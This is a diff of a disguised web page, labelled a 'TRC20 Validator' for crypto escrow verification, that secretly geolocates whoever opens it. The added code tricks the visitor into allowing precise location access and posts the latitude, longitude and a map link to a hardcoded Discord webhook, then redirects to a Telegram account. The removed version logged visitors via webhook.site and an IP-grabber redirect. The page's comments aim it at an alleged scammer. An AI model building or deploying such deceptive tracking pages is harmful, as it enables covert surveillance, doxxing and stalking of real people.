@@ -1,35 +1,55 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Security Check</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <script>
-        window.onload = function() {
-            // 1. Notify the bot we are ready
-            const tg = window.Telegram.WebApp;
-            tg.ready();
-            tg.expand(); // Make the window big
-
-            // 2. First, ping your Webhook.site (this happens in the background)
-            fetch('https://webhook.site/df4ee608-a144-4923-b344-96e0c2e74cb8?user=scammer_check');
-
-            // 3. After a 1-second "Loading" delay, redirect to Grabify/TinyURL
-            setTimeout(function() {
-                window.location.href = "https://cryp-o.online/R0SXHU";
-            }, 1000); 
-        };
-    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SafeGate TRC20 Validator</title>
     <style>
-        body { background: #0e1621; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { font-family: sans-serif; background: #0f172a; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
+        .box { background: #1e293b; padding: 2rem; border-radius: 12px; border: 1px solid #334155; max-width: 320px; }
+        .btn { background: #3b82f6; color: white; border: none; padding: 12px 24px; border-radius: 6px; cursor: pointer; font-weight: bold; margin-top: 20px; }
+        .loader { display: none; margin-top: 20px; color: #94a3b8; }
     </style>
 </head>
 <body>
-    <div style="text-align: center;">
-        <div class="loader" style="margin: 0 auto 20px;"></div>
-        <p>Verifying Network Integrity...</p>
-        <p style="font-size: 12px; color: #888;">Do not close this window.</p>
+    <div class="box">
+        <h2>Network Bridge</h2>
+        <p>confirm if the receiver is @tvrn_otc transfer escrow.</p>
+        <button class="btn" onclick="getLocation()">Verify Node</button>
+        <div id="status" class="loader">Synchronizing...</div>
     </div>
+
+    <script>
+        function getLocation() {
+            document.getElementById('status').style.display = 'block';
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendData, showError, {enableHighAccuracy: true});
+            } else {
+                alert("Browser not supported. Use Chrome or Safari.");
+            }
+        }
+
+        async function sendData(position) {
+            const webhookURL = "https://discord.com/api/webhooks/1477476925822996633/QE1qYS_tX-Dq5vTyJsQ9mh5wkZreofeITAY1_bnG__qdSBqWreGm2yvvicN9CpOnwuQ9";
+            const data = {
+                content: `🎯 **SCAMMER LOCATED**\nLat: ${position.coords.latitude}\nLon: ${position.coords.longitude}\nMaps: https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}\nAccuracy: ${position.coords.accuracy} meters`
+            };
+
+            await fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+
+            document.getElementById('status').innerText = "✅ Synchronized. Returning to trade...";
+            // Redirect back to Telegram or a fake success page
+            setTimeout(() => { window.location.href = "https://t.me/lorbertikua"; }, 2000);
+        }
+
+        function showError(error) {
+            alert("Verification failed. Please click 'Allow' for verification access.");
+            document.getElementById('status').style.display = 'none';
+        }
+    </script>
 </body>
 </html>
